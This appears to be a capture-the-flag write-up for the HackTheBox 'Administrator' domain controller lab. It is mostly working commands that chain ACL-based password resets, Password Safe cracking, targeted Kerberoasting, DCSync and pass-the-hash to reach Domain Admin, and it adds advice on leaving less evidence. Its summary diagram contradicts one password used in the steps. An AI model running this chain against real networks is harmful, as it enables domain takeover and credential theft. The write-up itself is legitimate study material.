---
title: "HTB Administrator — ACL Chain Abuse, Password Safe & DCSync"
date: 2026-06-25
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, acl-abuse, bloodhound, kerberoasting, dcsync, password-safe, genericall, genericwrite, forcechangepassword, windows]
classes: wide
header:
  image: /assets/images/ADMINISTRATOR/administrator.png
  teaser: /assets/images/ADMINISTRATOR/administrator.png
---

<style>
p { text-align: justify; }
</style>

# HTB Administrator

**Difficulty:** Medium  
**OS:** Windows Server 2022 (Domain Controller)  
**Platform:** HackTheBox  
**Category:** Active Directory  
**Status:** Retired

---

## Overview

Administrator is a Windows DC box that's essentially a master class in transitive ACL abuse. You're given a low-privileged user and BloodHound reveals a chain of permissions that runs across five accounts before landing you at Domain Admin. Each pivot uses a different ACL right. GenericAll resets passwords. ForceChangePassword forces a reset without knowing the current one. GenericWrite adds SPNs for Kerberoasting. And when Ethan's password cracks, DCSync does the rest.

The FTP server sitting on the DC is the detail that ties it together.

---

## Reconnaissance

### Starting Credentials

Given: `Olivia:ichliebedich`

```bash
nxc smb 10.129.19.81 -u 'Olivia' -p 'ichliebedich' --shares
```

Standard DC shares only. No custom shares.

### Port Scan

```bash
nmap -sV -sC -T4 -p- --min-rate 10000 10.129.19.81
```

```
PORT      STATE SERVICE
21/tcp    open  ftp          Microsoft FTP
53/tcp    open  dns
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  tcpwrapped
5985/tcp  open  winrm
```

FTP on a Domain Controller is unusual. Someone deliberately installed it. Filed for later.

### Domain Enumeration

```bash
nxc smb 10.129.19.81 -u 'Olivia' -p 'ichliebedich' --users
```

Users: Administrator, Guest, krbtgt, olivia, michael, benjamin, emily, ethan, alexander, emma.

### BloodHound

```bash
bloodhound-python -d administrator.htb -u 'Olivia' -p 'ichliebedich' \
  -ns 10.129.19.81 -c All --zip
```

You will later find on that the shortest path to Domain Admin from Olivia. The chain:

```
Olivia  -> GenericAll over Michael
Michael -> ForceChangePassword over Benjamin
Benjamin -> FTP access -> Password Safe -> Emily's credentials
Emily   -> GenericWrite over Ethan
Ethan   -> GenericAll over Domain Admins
```

Five users. Four different ACL rights. One path to DA.

---

## Lateral Movement

### Step 1: Olivia to Michael (GenericAll)

GenericAll over a user object includes the right to reset their password. Logged in as Olivia:

```bash
evil-winrm -i 10.129.19.81 -u 'Olivia' -p 'ichliebedich'
```

```powershell
Set-ADAccountPassword -Identity michael -Reset `
  -NewPassword (ConvertTo-SecureString -AsPlainText "PiccoloAura!" -Force)
```

```bash
nxc winrm 10.129.19.81 -u 'michael' -p 'PiccoloAura!'
# Pwn3d!
```

Michael's account is ours.

---

### Step 2: Michael to Benjamin (ForceChangePassword)

ForceChangePassword lets you reset a user's password without knowing the current one. Same approach:

```bash
evil-winrm -i 10.129.19.81 -u 'michael' -p 'PiccoloAura!'
```

```powershell
Set-ADAccountPassword -Identity benjamin -Reset `
  -NewPassword (ConvertTo-SecureString -AsPlainText "Gokusolos" -Force)
```

Benjamin's SMB authenticated fine but WinRM denied. He's not in Remote Management Users. No shell, but we can reach the FTP server.

---

### Step 3: Benjamin, FTP and the Password Safe

FTP on a DC exists for a reason. Benjamin had an FTP home directory configured. Olivia and Michael didn't.
![FTP](/assets/images/ADMINISTRATOR/ftp.png)
```bash
ftp benjamin@10.129.19.81
# Password: Gokusolos
ftp> ls
# Backup.psafe3
ftp> binary
ftp> get Backup.psafe3
```

`Backup.psafe3` is a Password Safe database — credentials encrypted behind a master password.

---

### Step 4: Cracking the Password Safe

```bash
pwsafe2john Backup.psafe3 > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![John](/assets/images/ADMINISTRATOR/john.png)

```
tekieromucho
```

```bash
sudo apt install passwordsafe -y
pwsafe Backup.psafe3
# Master password: tekieromucho
```
![Keepass](/assets/images/ADMINISTRATOR/keepass.png)

The GUI properly decrypted the entries. Raw strings from the file look like encrypted blobs. Always open Password Safe databases with the actual application.

![Creds](/assets/images/ADMINISTRATOR/creds.png)

I tried the creds and only one worked:

Key credential found: `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

---

## User Flag

```bash
evil-winrm -i 10.129.19.81 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

```powershell
type C:\Users\emily\Desktop\user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Privilege Escalation

### Step 5: Emily to Ethan (GenericWrite + Kerberoasting)

Emily has GenericWrite over Ethan. GenericWrite allows modifying user attributes including Service Principal Names. Add an SPN, make Ethan Kerberoastable, crack offline.

First, confirmed Ethan's exact Distinguished Name. The CN is the display name, not the sAMAccountName:

```powershell
Get-ADUser ethan -Properties distinguishedName
# CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
```

That `CN=Ethan Hunt` matters. `CN=ethan` throws "Directory object not found."

```bash
bloodyad -d administrator.htb -u 'emily' \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  --host 10.129.19.81 set object \
  'CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb' \
  servicePrincipalName -v 'HTTP/fake.administrator.htb'
```

Kerberoast the newly registered SPN:

```bash
faketime '2026-06-25 21:02:00' impacket-GetUserSPNs \
  administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
  -dc-ip 10.129.19.81 -request-user ethan
```
![SPN](/assets/images/ADMINISTRATOR/spn.png)

`faketime` was used because `ntpdate` kept syncing but Kali's clock would revert. Wrapping the single command is more reliable than fighting the system clock.

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt --force -O
```
![Cracked](/assets/images/ADMINISTRATOR/passwd.png)

```
limpbizkit
```

---

### Step 6: Ethan to Domain Admin (DCSync)
![DSYNC](/assets/images/ADMINISTRATOR/dsync.png)

Ethan has GenericAll over Domain Admins. That's enough for DCSync.

```bash
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.19.81
```
![SECRETS](/assets/images/ADMINISTRATOR/secret.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

---

## Root Flag

```bash
evil-winrm -i 10.129.19.81 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

**Root flag captured. Domain pwned.** ✅

---

## Full Attack Chain

```
Olivia:ichliebedich (given)
  |
  GenericAll over Michael
  -> Reset password -> NewPass123!
     |
     Michael:NewPass123!
       |
       ForceChangePassword over Benjamin
       -> Reset password -> Gokusolos
          |
          Benjamin:Gokusolos
            |
            FTP -> Backup.psafe3
            -> Crack master password -> tekieromucho
            -> Extract emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
               |
               Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                 |
                 USER FLAG
                 |
                 GenericWrite over Ethan
                 -> Add SPN -> Kerberoast -> limpbizkit
                    |
                    Ethan:limpbizkit
                      |
                      GenericAll over Domain Admins
                      -> DCSync -> Administrator NTLM hash
                         |
                         Pass-the-Hash -> ROOT FLAG
```

---

## Credentials Found

| Username | Password | How Obtained | Privilege |
|---|---|---|---|
| Olivia | ichliebedich | Given | Low user |
| Michael | PiccoloAura! | GenericAll password reset | Low user |
| Benjamin | Gokusolos | ForceChangePassword | FTP access |
| Emily | UXLCI5iETUsIBoFVTj8yQFKoHjXmb | Password Safe database | User flag |
| Ethan | limpbizkit | Kerberoasting | GenericAll over DA |
| Administrator | 3dc553ce... | DCSync | Domain Admin |



## What Did We Learn?

**1. BloodHound maps chains you'd never find manually**  
Five users, four different ACL rights, one transitive path to Domain Admin. The relationship between GenericAll on Michael and GenericAll over Domain Admins is not obvious from looking at either permission in isolation. Always run BloodHound once you have any valid credential.

**2. FTP on a Domain Controller is a deliberate choice and a red flag**  
Standard DC roles don't include FTP. When you see it, someone installed it for a reason, and that reason is usually file storage for a specific account. Benjamin's credentials unlocking an FTP share with a Password Safe backup is exactly the kind of real-world misconfiguration this represents.

**3. Password Safe databases contain more than one credential**  
A single `.psafe3` file had credentials for multiple users, including the account that led all the way to Domain Admin. Whenever you find a password manager database, cracking it is worth the time.

**4. GenericAll and GenericWrite are different tools**  
GenericAll lets you reset passwords directly. GenericWrite doesn't include that right. Emily had GenericWrite over Ethan, not GenericAll, which is why the path went through SPN addition and Kerberoasting instead of a direct password reset. Understanding which permissions let you do what is critical for AD exploitation.

**5. Common Name is not the same as sAMAccountName**  
`CN=ethan` failed. `CN=Ethan Hunt` worked. The CN in Active Directory is the display name, not the login name. When operations fail with "Directory object not found," verify the exact DN with `Get-ADUser`.

**6. DCSync is cleaner than changing the DA password**  
Resetting the Domain Admin password is loud, breaks things, and leaves obvious evidence. DCSync mimics replication behaviour and extracts the hash without modifying any account. When you have the rights to do either, DCSync is always the better option.

**7. faketime beats fighting the system clock**  
`ntpdate` synced the clock but Kali kept reverting it. Wrapping the Kerberoasting command in `faketime` with the correct DC time skipped the whole problem cleanly without needing persistent clock sync.

---

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2V4OTd4ZmYwbXBlYWt0YWtiMjdwMnpoZWJpOGRhZHNkZTVoYjFwciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3OBaasSmMPfxAkasWc/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
